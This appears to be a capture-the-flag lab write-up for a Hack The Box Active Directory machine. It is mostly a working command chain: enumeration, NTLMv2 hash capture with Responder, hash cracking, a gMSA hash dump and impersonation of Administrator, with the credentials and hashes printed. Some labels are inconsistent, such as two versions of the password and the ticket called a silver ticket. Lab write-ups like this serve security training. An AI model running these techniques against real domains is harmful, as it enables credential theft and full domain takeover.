IP address - 10.10.10.248
Domain name `intelligence.htb`


`smbclient -L //intelligence.htb`

- Anonymous login successful but no shares 

`ldapsearch -x -h intelligence.htb -s base namingcontexts `
```
Possible users - 

william lee 

Jose williams 

Web server enumeration - 

Found 2 pdf files!
```

`exiftool <pdf name>` - extracted 2 usernames 

wordlist - 
```
Guest 

William 

Jose.William 

William.Lee

Administrator
```
Deafult password - 

**wIntelligenceCorpUser9876**

`./kerbrute userenum --dc intelligence.htb -d intelligence.htb users.lst`


`smbmap -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' -d intelligence.htb -H 10.10.10.248`
Shares - 
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	IT                                                	READ ONLY	
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY

SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 

`smbclient //intelligence.htb/Users -U 'Tiffany.Molina' `

`python3 /root/BloodHound.py/bloodhound.py -c All,LoggedOn -u "Tiffany.molina" -p "NewIntelligenceCorpUser9876" -d intelligence.htb -ns 10.10.10.248`

*In **IT share** there is a downdector.ps1* (runs cronjob every 5 minutes ) - use of responder to capture the hash 
`python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 
'weboops.intelligence.htb' -d 10.10.14.2 10.10.10.248` - adding of a new dns record so we cannot listen for a hash (DNS is in records now)

`responder -I tun0`

`[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:ce004c8c341e4d10:61FEADD1FFBD8828F319D1C91E00159D:01010000000000003E2FE017B5BDD701181BF2560048D1EF0000000002000800420057004400580001001E00570049004E002D005800530046004B00340030004E0037003700460030000400140042005700440058002E004C004F00430041004C0003003400570049004E002D005800530046004B00340030004E0037003700460030002E0042005700440058002E004C004F00430041004C000500140042005700440058002E004C004F00430041004C00080030003000000000000000000000000020000067F9707426C2D66DB74A01C9E08E3EABC0A39EE189C767E490A37DFCE19AB51B0A0010000000000000000000000000000000000009003A0048005400540050002F007700650062006F006F00700073002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000`

`hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt` - Mr.Teddy(password)

*Obtaining the kerberos ticket using the service hash *
`python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb'` - enumeration of LDAP 
svc_int$:::d170ae19de30439df55d6430e12dd621
(Reads any gMSA password blobs the user can access and parses the values.)

`python3 /root/impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes ':d170ae19de30439df55d6430e12dd621' -impersonate Administrator`

`export KRB5CCNAME=Administrator.ccache` - exporting kerberos silver ticket 
`smbclient.py -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass` - Authentication using silver ticket 
